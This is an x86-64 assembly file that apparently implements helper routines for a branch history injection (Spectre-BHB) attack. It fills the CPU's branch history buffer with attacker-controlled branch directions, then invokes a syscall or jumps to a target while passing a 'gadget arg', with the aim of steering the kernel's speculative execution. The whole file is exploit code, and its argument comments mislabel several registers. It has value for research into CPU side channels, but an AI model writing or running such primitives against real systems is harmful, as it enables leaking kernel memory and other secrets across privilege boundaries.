#define MAX_HISTORY_SIZE 420

.intel_syntax noprefix

.section .text

# The kernel interface uses %rdi, %rsi, %rdx, %r10, %r8 and %r9
# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ; fill_bhb
# ; - arg 1 - rdi: ptr to history
# ; - arg 2 - rsi: syscall nr
# ; - arg 3 - rdx: syscall arg1
# ; - arg 4 - rcx: syscall arg2
# ; - arg 5 - rcx: syscall arg3
# ; - arg 6 - rcx: syscall arg4
# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
.global fill_bhb
.align 4096
fill_bhb:

    # Perform 420 conditional branches to fill the BHB
    # rdi points to an array of 420 bytes that dictates the direction of
    # all the 420 branches
    .rept MAX_HISTORY_SIZE
        movzx   rax, BYTE PTR [rdi]
        inc     rdi
        cmp     rax, 1
        je      1f
        1:
    .endr

    push r15


    mov     rax, rsi
    push rbx
    mov     rbx, rdx # tfp_arg
    mov     r15, rcx # gadget arg

    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx
    xor rcx, rcx
    xor r8, r8
    xor r9, r9
    xor r10, r10


    push r11
    push r12
    push r13
    push r14
    push rbp

    xor r11, r11
    xor r12, r12
    xor r13, r13
    xor r14, r14
    xor rbp, rbp

    syscall

    pop rbp
    pop r14
    pop r13
    pop r12
    pop r11
    pop rbx

    pop r15

    ret


.global static_fill_bhb_call
.align 4096
static_fill_bhb_call:
    # Perform 194 conditional branches to fill the BHB statically
    # next call a syscall
    mov     rax, 1
    cmp     rax, 1
    .rept 194
        je      1f
        # Some padding to not stress the BTB
        .rept 3
            .BYTE 0x0f, 0x1f, 0x00
        .endr
        1:
    .endr
    mov     rax, rdi
    mov     rdi, rsi
    mov     rsi, rdx
    mov     rdx, rcx
    mov     rcx, r8

    xor r9, r9
    xor r10, r10
    xor r11, r11

    jmp     rax


.global fill_bhb_call
fill_bhb_call:

    # Perform 420 conditional branches to fill the BHB
    # next jmp to the location of the 2th argument
    .rept MAX_HISTORY_SIZE
        movzx   rax, BYTE PTR [rdi]
        inc     rdi
        cmp     rax, 1
        je      1f
        1:
    .endr
    mov     rax, rsi
    mov     rdi, rdx
    mov     rsi, rcx
    mov     rdx, r8
    mov     rcx, r9
    mov     r8, 0
    mov     r9, 0
    jmp     rax
